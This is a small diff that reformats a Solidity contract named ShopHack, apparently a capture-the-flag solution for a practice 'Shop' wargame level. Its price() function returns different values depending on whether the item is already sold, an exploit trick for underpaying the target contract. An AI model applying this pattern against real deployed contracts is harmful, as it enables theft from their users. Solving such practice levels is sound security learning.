+++ src/Shop/ShopHack.sol
@@ -1,7 +1,8 @@
 // SPDX-License-Identifier: MIT
 
 pragma solidity ^0.8.10;
-import './Shop.sol';
+
+import "./Shop.sol";
 
 contract ShopHack {
     Shop shop;
@@ -10,7 +11,7 @@ contract ShopHack {
         shop = _shop;
     }
 
-    function price() external view returns(uint) {
+    function price() external view returns (uint256) {
         return !shop.isSold() ? 100 : 0;
     }
